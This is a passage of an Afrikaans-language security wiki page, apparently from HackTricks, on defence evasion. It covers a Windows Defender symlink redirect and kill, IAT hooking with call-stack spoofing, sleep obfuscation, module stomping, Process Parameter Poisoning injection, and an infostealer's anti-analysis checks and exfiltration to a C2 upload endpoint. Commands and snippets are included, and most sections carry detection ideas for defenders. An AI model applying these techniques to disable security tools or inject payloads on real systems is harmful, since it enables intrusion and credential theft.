set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Skep ’n gids-simlink na ’n hoër weergawe binne Platform wat na jou gids wys:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Snellerkeuse (herlaai aanbeveel):
```cmd
shutdown /r /t 0
```
4) Verifieer dat MsMpEng.exe (WinDefend) vanaf die herlei pad loop:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
You should observe the new process path under `C:\TMP\AV\` and the service configuration/registry reflecting that location.

Post-exploitation options
- DLL sideloading/code execution: Drop/replace DLLs wat Defender from its application directory loads om code in Defender’s processes uit te voer. See the section above: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Remove the version-symlink so on next start the configured path doesn’t resolve and Defender fails to start:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Let daarop dat hierdie tegniek nie op sy eie privilege escalation verskaf nie; dit vereis admin-regte.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams kan runtime-evasion uit die C2-implantaat en na die teikenmodule self verskuif deur sy Import Address Table (IAT) te hook en geselekteerde API's deur aanvaller-beheerde, position-independent code (PIC) te stuur. Dit veralgemeen evasion verder as die klein API-oppervlak wat baie kits blootstel (bv. CreateProcessA), en brei dieselfde beskerming uit na BOFs en post-exploitation DLL's.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Benadering op hoë vlak
- Stage 'n PIC blob langs die teikenmodule met behulp van 'n reflective loader (voorafgeplaas of companion). Die PIC moet selfstandig en position-independent wees.
- Wanneer die host-DLL laai, loop deur sy IMAGE_IMPORT_DESCRIPTOR en patch die IAT-inskrywings vir geteikende imports (bv. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) om na dun PIC-wrappers te wys.
- Elke PIC-wrapper voer evasions uit voordat dit die regte API-adres tail-call. Tipiese evasions sluit in:
- Memory mask/unmask rondom die call (bv. enkripteer beacon-streke, RWX→RX, verander page-name/-permissions) en herstel dit ná die call.
- Call-stack spoofing: konstrueer 'n onskadelike stack en transition na die teiken-API sodat call-stack-analise na verwagte frames resolveer.<sup>[[9]](#references)</sup>
- Vir compatibility, export 'n interface sodat 'n Aggressor-script (of ekwivalent) kan registreer watter API's vir Beacon, BOFs en post-ex DLL's gehook moet word.

Waarom IAT hooking hier
- Werk vir enige code wat die gehookte import gebruik, sonder om tool-code te wysig of op Beacon staat te maak om spesifieke API's te proxy.
- Dek post-ex DLL's: hooking van LoadLibrary* laat jou toe om module-loads te onderskep (bv. System.Management.Automation.dll, clr.dll) en dieselfde masking-/stack-evasion op hul API-calls toe te pas.
- Herstel betroubare gebruik van process-spawning post-ex commands teen call-stack-gebaseerde detections deur CreateProcessA/W te wrap.

Minimale IAT hook-skets (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notas
- Pas die patch toe ná relocations/ASLR en vóór die eerste gebruik van die import. Reflective loaders soos TitanLdr/AceLdr demonstreer hooking tydens DllMain van die gelaaide module.
- Hou wrappers klein en PIC-safe; resolve die ware API via die oorspronklike IAT-waarde wat jy vóór patching vasgelê het, of via LdrGetProcedureAddress.
- Gebruik RW → RX-oorgange vir PIC en vermy dit om writable+executable pages agter te laat.

Call-stack spoofing stub
- Draugr-styl PIC-stubs bou ’n vals call chain (return addresses na benign modules) en pivot dan na die ware API.
- Dit verslaan detections wat canonical stacks van Beacon/BOFs na sensitiewe APIs verwag.
- Kombineer dit met stack cutting/stack stitching-tegnieke om binne verwagte frames te land vóór die API-prologue.

Operasionele integrasie
- Voeg die reflective loader vooraan post-ex DLLs sodat die PIC en hooks outomaties initialiseer wanneer die DLL gelaai word.
- Gebruik ’n Aggressor script om target APIs te registreer sodat Beacon en BOFs deursigtig voordeel trek uit dieselfde evasion path sonder code changes.

Detection/DFIR-oorwegings
- IAT-integriteit: entries wat na non-image (heap/anon) addresses resolve; periodieke verification van import pointers.
- Stack anomalies: return addresses wat nie aan loaded images behoort nie; abrupte transitions na non-image PIC; inkonsekwente RtlUserThreadStart-ancestry.
- Loader telemetry: in-process writes na IAT, vroeë DllMain-aktiwiteit wat import thunks wysig, onverwagte RX-regions wat tydens load geskep word.
- Image-load evasion: indien LoadLibrary* gehoek word, monitor verdagte loads van automation/clr assemblies wat met memory masking events korreleer.

Verwante boublokke en voorbeelde
- Reflective loaders wat IAT patching tydens load uitvoer (bv. TitanLdr, AceLdr)
- Memory masking hooks (bv. simplehook) en stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (bv. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via ’n residente PICO

As jy ’n reflective loader beheer, kan jy imports **tydens** `ProcessImports()` hook deur die loader se `GetProcAddress`-pointer te vervang met ’n custom resolver wat eers vir hooks kyk:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Bou ’n **residente PICO** (persistent PIC object) wat voortbestaan nadat die transient loader PIC homself vrygestel het.
- Export ’n `setup_hooks()`-funksie wat die loader se import resolver oorskryf (bv. `funcs.GetProcAddress = _GetProcAddress`).
- In `_GetProcAddress`, skip ordinal imports en gebruik ’n hash-based hook lookup soos `__resolve_hook(ror13hash(name))`. As ’n hook bestaan, return dit; anders delegateer na die ware `GetProcAddress`.
- Registreer hook targets tydens link time met Crystal Palace `addhook "MODULE$Func" "hook"`-entries. Die hook bly geldig omdat dit binne die residente PICO leef.

Dit lewer **import-time IAT redirection** sonder om die gelaaide DLL se code section ná load te patch.

### Forcing van hookable imports wanneer die target PEB-walking gebruik

Import-time hooks word slegs geaktiveer as die funksie werklik in die target se IAT is. As ’n module APIs via ’n PEB-walk + hash resolve (sonder ’n import entry), force ’n werklike import sodat die loader se `ProcessImports()`-path dit sien:

- Vervang hashed export resolution (bv. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) met ’n direkte reference soos `&WaitForSingleObject`.
- Die compiler emit ’n IAT-entry, wat interception moontlik maak wanneer die reflective loader imports resolve.

### Ekko-styl sleep/idle obfuscation sonder om `Sleep()` te patch

In plaas daarvan om `Sleep` te patch, hook die **werklike wait/IPC-primitives** wat die implant gebruik (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Vir lang waits, wrap die call in ’n Ekko-styl obfuscation chain wat die in-memory image tydens idle encrypt:<sup>[[31]](#references)[[27]](#references)</sup>

- Gebruik `CreateTimerQueueTimer` om ’n sequence callbacks te schedule wat `NtContinue` met crafted `CONTEXT`-frames call.
- Tipiese chain (x64): stel image op `PAGE_READWRITE` → RC4-encrypt via `advapi32!SystemFunction032` oor die volledige mapped image → voer die blocking wait uit → RC4-decrypt → **restore per-section permissions** deur PE-sections te loop → signal completion.
- `RtlCaptureContext` verskaf ’n template `CONTEXT`; clone dit in multiple frames en stel registers (`Rip/Rcx/Rdx/R8/R9`) om elke step aan te roep.

Operasionele detail: return “success” vir lang waits (bv. `WAIT_OBJECT_0`) sodat die caller voortgaan terwyl die image gemasker is. Hierdie patroon verberg die module vir scanners tydens idle windows en vermy die klassieke “patched `Sleep()`”-signature.

Detection-idees (telemetry-based)
- Bursts van `CreateTimerQueueTimer`-callbacks wat na `NtContinue` wys.
- `advapi32!SystemFunction032` wat op groot aaneenlopende image-sized buffers gebruik word.
- Groot-range `VirtualProtect` gevolg deur custom per-section permission restoration.

### Runtime CFG registration vir sleep-obfuscation gadgets

Op CFG-enabled targets sal die eerste indirect jump na ’n mid-function gadget soos `jmp [rbx]` of `jmp rdi` gewoonlik die proses laat crash met `STATUS_STACK_BUFFER_OVERRUN`, omdat die gadget nie in die module se CFG-metadata voorkom nie. Om Ekko/Kraken-styl chains binne hardened processes aan die gang te hou:<sup>[[30]](#references)</sup>

- Registreer elke indirect destination wat deur die chain gebruik word met `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` en `CFG_CALL_TARGET_VALID`-entries.
- Vir addresses binne loaded images (`ntdll`, `kernel32`, `advapi32`) moet die `MEMORY_RANGE_ENTRY` by die **image base** begin en die **volledige image size** dek.
- Vir manually mapped/PIC/stomped regions, gebruik eerder die **allocation base** en allocation size.
- Markeer nie net die dispatch gadget nie, maar ook exports wat indirek bereik word (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) en enige attacker-controlled executable sections wat indirect targets sal word.

Dit verander ROP/JOP-styl sleep chains van “werk slegs in non-CFG processes” na ’n herbruikbare primitive vir `explorer.exe`, browsers, `svchost.exe` en ander endpoints wat met `/guard:cf` gekompileer is.

### CET-safe stack spoofing vir sleeping threads

Volledige `CONTEXT` replacement is noisy en kan op CET Shadow Stack-systems breek omdat ’n spoofed `Rip` steeds met die hardware shadow stack moet ooreenstem. ’n Veiliger sleep-masking-patroon is:<sup>[[30]](#references)</sup>

- Kies ’n ander thread in dieselfde proses en lees sy `NT_TIB` / TEB-stack boundaries (`StackBase`, `StackLimit`) via `NtQueryInformationThread`.
- Backup die huidige thread se werklike TEB/TIB.
- Capture die werklike sleeping context met `GetThreadContext`.
- Copy **slegs** die werklike `Rip` na die spoof context en laat die spoofed `Rsp`/stack state onveranderd.
- Kopieer tydens die sleep window die spoof thread se `NT_TIB` na die huidige TEB sodat stack walkers binne ’n legitimate stack range unwind.
- Ná die wait voltooi is, restore die oorspronklike TIB en thread context.

Dit behou ’n CET-consistent instruction pointer terwyl dit EDR-stack walkers mislei wat TEB-stack metadata vertrou om unwinds te valideer.

### APC-based alternatief: Kraken Mask

As timer-queue dispatch te signatured is, kan dieselfde sleep-encrypt-spoof-restore-sequence vanuit ’n suspended helper thread met queued APCs uitgevoer word:<sup>[[27]](#references)</sup>

- Skep ’n helper thread met `NtTestAlert` as entrypoint.
- Queue prepared `CONTEXT`-frames/APCs met `NtQueueApcThread` en drain hulle met `NtAlertResumeThread`.
- Store die chain state op die heap in plaas van die helper stack om te voorkom dat die default 64 KB thread stack uitgeput word.
- Gebruik `NtSignalAndWaitForSingleObject` om die start event atomies te signal en te block.
- Suspend die main thread voordat die TIB/context gerestore word (`NtSuspendThread` → restore → `NtResumeThread`) om die race window te verklein waarin ’n scanner ’n half-gerestored stack kan opvang.

Dit vervang die `CreateTimerQueueTimer` + `NtContinue`-signature met ’n helper-thread/APC-signature, terwyl dieselfde RC4-masking- en stack-spoofing-doelwitte behou word.

Bykomende detection-idees
- `NtSetInformationVirtualMemory` met `VmCfgCallTargetInformation` kort voor sleeps, waits of APC dispatch.
- `GetThreadContext`/`SetThreadContext` wat om `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` of `ConnectNamedPipe` gewrap word.
- `NtQueryInformationThread` gevolg deur direkte writes na die huidige thread se TEB/TIB-stack boundaries.
- `NtQueueApcThread`/`NtAlertResumeThread`-chains wat indirek `SystemFunction032`, `VirtualProtect` of section-permission restoration helpers bereik.
- Herhaalde gebruik van kort gadget-signatures soos `FF 23` (`jmp [rbx]`) of `FF E7` (`jmp rdi`) as dispatch pivots binne signed modules.


## Precision Module Stomping

Module stomping voer payloads uit die **`.text` section van ’n DLL wat reeds binne die target process gemap is** in plaas daarvan om ooglopende private executable memory te allokeer of ’n vars sacrificial DLL te laai. Die overwrite target moet ’n **gelaaide, disk-backed image** wees waarvan die code space die payload kan akkommodeer sonder om code paths wat die proses nog benodig, te korrupteer.<sup>[[1]](#references)[[2]](#references)</sup>

### Betroubare target selection

Naive stomping teen algemene modules soos `uxtheme.dll` of `comctl32.dll` is fragiel: die DLL is moontlik nie in die remote process gelaai nie, en ’n te klein code region sal die proses laat crash. ’n Meer betroubare workflow is:

1. Enumerate die target process se modules en hou ’n **names-only include list** van DLLs wat reeds gelaai is.
2. Bou eers die payload en teken die **presiese byte size** aan.
3. Scan candidate DLLs op skyf en vergelyk die PE-section **`.text` `Misc_VirtualSize`** met die payload size. Dit is belangriker as die file size omdat dit die grootte van die executable section weerspieël **wanneer dit in memory gemap is**.
4. Parse die **Export Address Table (EAT)** en kies ’n exported function RVA as die stomp start offset.
5. Bereken die **blast radius**: as die payload die geselekteerde function boundary oorskry, sal dit aangrensende exports wat daarna in memory gelê is, overwrite.

Tipiese recon/selection helpers wat in die wild gesien word:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Operasionele notas
- Verkies DLLs wat **reeds gelaai** is in die afgeleë proses om die telemetry van `LoadLibrary`/onverwagte image loads te vermy.
- Verkies exports wat selde deur die teikentoepassing uitgevoer word; anders kan normale code paths die gestompte bytes voor of ná thread creation bereik.
- Groot implants vereis dikwels dat shellcode-embedding van ’n string literal na ’n **byte-array/braced initializer** verander word sodat die volledige buffer korrek in die injector source verteenwoordig word.

Opsporingsidees
- Afgeleë writes na **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) in plaas van die meer algemene private RWX/RX allocations.
- Export entry points waarvan die in-memory bytes nie meer met die backing file op skyf ooreenstem nie.
- Remote threads of context pivots wat begin uitvoer binne ’n legitieme DLL export waarvan die eerste bytes onlangs gewysig is.
- Verdachte `VirtualProtect(Ex)` / `WriteProcessMemory`-reekse teen DLL `.text` pages, gevolg deur thread creation.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) is ’n **process-injection / EDR-evasion**-tegniek wat die klassieke remote write path (`VirtualAllocEx` + `WriteProcessMemory`) vermy. In plaas daarvan om bytes na ’n reeds lopende teiken te kopieer, buit dit die feit uit dat Windows geselekteerde `CreateProcessW`-startup parameters na die child process **kopieer** en dit binne `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) stoor.<sup>[[28]](#references)[[29]](#references)</sup>

### Poisonable carriers copied by `CreateProcessW`

Nuttige carriers is:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (met `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktiese carrier-beperkings:

- `lpCommandLine` moet na **skryfbare memory** wys vir `CreateProcessW` en is beperk tot **32,767 Unicode characters**, insluitend die null terminator.
- `lpEnvironment` moet ’n Unicode environment block wees van opeenvolgende `NAME=VALUE\0`-strings wat met ’n ekstra `\0` beëindig word.
- `lpReserved` is amptelik gereserveer, dus moet die `ShellInfo`-mapping as ’n implementation detail eerder as ’n stabiele gedokumenteerde kontrak beskou word.

Dit verander normale process creation in die **payload-transfer primitive**. Die operator skep die child process met attacker-controlled startup data en laat Windows die cross-process copy uitvoer.

### Remote lookup flow without remote write APIs

Nadat die child geskep is, resolve die gekopieerde buffer met **read-only** primitives:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → kry `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Lees die remote `PEB`
3. Volg `PEB.ProcessParameters`
4. Lees `RTL_USER_PROCESS_PARAMETERS`
5. Gebruik die geselekteerde pointer:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Minimale vloei:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Uitvoering van die gekopieerde parameter buffer

Die gekopieerde parameterstreek is gewoonlik `RW`, nie uitvoerbaar nie. ’n Algemene P3 chain is:

1. Skep die proses normaalweg (nie suspended nie)
2. Maak die gekose parameter page uitvoerbaar met `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Hergebruik die main thread handle wat reeds in `PROCESS_INFORMATION` teruggestuur is
4. Herlei uitvoering met `NtSetContextThread` (`CONTEXT_CONTROL`, oorskryf `RIP`)

Anders as klassieke thread hijacking-workflows, **vereis dit nie** `SuspendThread` / `ResumeThread` nie; die context kan direk op die teruggestuurde main thread handle verander word.

Dit vermy verskeie APIs wat algemeen vir injection gemonitor word:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- dikwels ook `SuspendThread` / `ResumeThread`

### Null-byte-beperking en staged shellcode

Al drie carriers is **string- of string-agtige data**, dus word ’n raw payload wat `0x00` bevat tydens oordrag afgekap. ’n Praktiese oplossing is ’n **null-free first stage** wat constants tydens runtime rekonstrueer en dan ’n arbitrêre second stage laai.

’n Eenvoudige patroon is XOR-gebaseerde constant synthesis:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Dit stel die eerste stadium in staat om stack-stringe, API-argumente, DLL-paaie of ’n second-stage shellcode loader te bou sonder om null-grepe in die vervoerde parameter in te bed.

### Stack-gebaseerde API-oproepe vanaf die eerste stadium

Wanneer die eerste stadium API’s soos `LoadLibraryA` moet oproep, kan dit:

- die string/buffer op die teiken se stack push
- die **32-byte x64 shadow space** reserveer
- `RCX`, `RDX`, `R8`, `R9` op konstantes of `RSP`-relatiewe pointers stel
- `RSP` **16-byte aligned** hou vóór die oproep

’n Second stage kan dan vanaf die stack na ’n `PAGE_READWRITE`-allokasie gekopieer word, met `VirtualProtect` na `PAGE_EXECUTE_READ` verander word, en daarnaartoe gespring word, wat ’n direkte RWX-allokasie vermy.

### Detection-idees

Goeie hunting-geleenthede wat deur die outeurs genoem word:

- `VirtualProtectEx` / `NtProtectVirtualMemory` wat **process-parameter pages executable** maak
- daardie protection change gevolg deur `SetThreadContext` / `NtSetContextThread`
- remote reads van `PEB` en daarna `RTL_USER_PROCESS_PARAMETERS`
- buitengewoon lang / hoë-entropy `lpCommandLine`, `lpEnvironment` of `STARTUPINFO.lpReserved`-waardes tydens process creation

### Notas

- P3 is ’n **cross-process transfer trick**, nie op sigself ’n volledige execution primitive nie: die gekopieerde parameter benodig steeds ’n execute-permission change en ’n execution redirection method.
- `RtlCreateProcessReflection` / Dirty Vanity is deur die outeurs oorweeg, maar verwerp omdat dit intern by verdagte primitives soos `NtWriteVirtualMemory` en `NtCreateThreadEx` uitkom.

## SantaStealer Tradecraft vir Fileless Evasion en Credential Theft

SantaStealer (ook bekend as BluelineStealer) illustreer hoe moderne info-stealers AV bypass, anti-analysis en credential access in ’n enkele workflow kombineer.<sup>[[24]](#references)</sup>

### Sleutelborduitleg-kontroles en sandbox-vertraging

- ’n Konfigurasievlag (`anti_cis`) lys geïnstalleerde sleutelborduitlegte via `GetKeyboardLayoutList`. As ’n Cyrilliese uitleg gevind word, plaas die sample ’n leë `CIS`-merker en termineer dit voordat stealers uitgevoer word, wat verseker dat dit nooit op uitgeslote locales uitvoer nie, terwyl dit ’n artefak vir hunting agterlaat.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Gelaagde `check_antivm`-logika

- Variant A loop deur die proseslys, hash elke naam met ’n pasgemaakte rollende kontrolesom, en vergelyk dit met ingebedde bloklyste vir debuggers/sandboxes; dit herhaal die kontrolesom oor die rekenaarnaam en kontroleer werksgidse soos `C:\analysis`.
- Variant B inspekteer stelseleienskappe (minimum prosesaantal, onlangse uptime), roep `OpenServiceA("VBoxGuest")` aan om VirtualBox additions op te spoor, en doen tydsberekeningskontroles rondom slaaptye om single-stepping raak te sien. Enige treffer staak die uitvoering voordat modules geloods word.

### Fileless helper + dubbele ChaCha20 reflective loading

- Die primêre DLL/EXE bevat ’n Chromium credential helper wat óf na skyf geskryf óf met die hand in die geheue gemap word; fileless mode los imports/relocations self op sodat geen helper-artefakte geskryf word nie.
- Daardie helper stoor ’n second-stage DLL wat twee keer met ChaCha20 geënkripteer is (twee 32-greutel-sleutels + 12-greutel-nonces). Ná albei passe laai dit die blob reflectively (geen `LoadLibrary` nie) en roep exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` aan, afgelei van [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Die ChromElevator-roetines gebruik direct-syscall reflective process hollowing om in ’n aktiewe Chromium-browser te inject, AppBound Encryption-sleutels te erf, en wagwoorde/cookies/kredietkaarte direk uit SQLite-databasisse te decrypt ondanks ABE-hardening.


### Modular in-memory collection & chunked HTTP exfil

- `create_memory_based_log` iterereer deur ’n globale `memory_generators`-funksiewysertabel en skep een thread per geaktiveerde module (Telegram, Discord, Steam, screenshots, dokumente, browser extensions, ens.). Elke thread skryf resultate na gedeelde buffers en rapporteer sy lêertelling ná ’n join-venster van ongeveer 45 sekondes.
- Wanneer dit klaar is, word alles met die staties gelinkte `miniz`-biblioteek as `%TEMP%\\Log.zip` gezip. `ThreadPayload1` slaap dan 15 sekondes en stroom die argief in 10 MB-stukke via HTTP POST na `http://<C2>:6767/upload`, terwyl dit ’n browser se `multipart/form-data`-boundary (`----WebKitFormBoundary***`) namaak. Elke stuk voeg `User-Agent: upload`, `auth: <build_id>`, opsioneel `w: <campaign_tag>`, by, en die laaste stuk voeg `complete: true` by sodat die C2 weet dat hersamestelling voltooi is.

## References

- [1] [Gevorderde Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, geen meer gratis passe vir malware nie](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – dokumentasie](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – voorbeeld](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – voorbeeld](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Nuwe infeksieketting en ConfuserEx-gebaseerde obfuskasie vir DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Moet jy jou zero trust vertrou? Omseiling van Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Voor ToolShell: Ondersoek na Storm-2603 se vorige ransomware-bedrywighede](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Misbruik van forwarded exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Soekvolgorde vir dynamic-link libraries](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Prosessekuriteit en toegangsregte](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU-verwysing (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL-launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Bekamping van EDRs met die ondersteuning van Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Breek die beskermende dop van Windows Defender met die folder redirect-tegniek](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink-opdragverwysing](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Onder die Pure Curtain: Van RAT tot builder tot coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer kom dorp toe: ’n Nuwe, ambisieuse infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Verslaan van Node.js-malware met API-tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Om Adaptix met Crystal Palace in die bed te sit](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET en Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Versteek jou Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [Sleeping Beauty: Misbruik van Chrome Remote Desktop in Red Team-operasies – ’n praktiese gids](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
{{#include ../banners/hacktricks-training.md}}
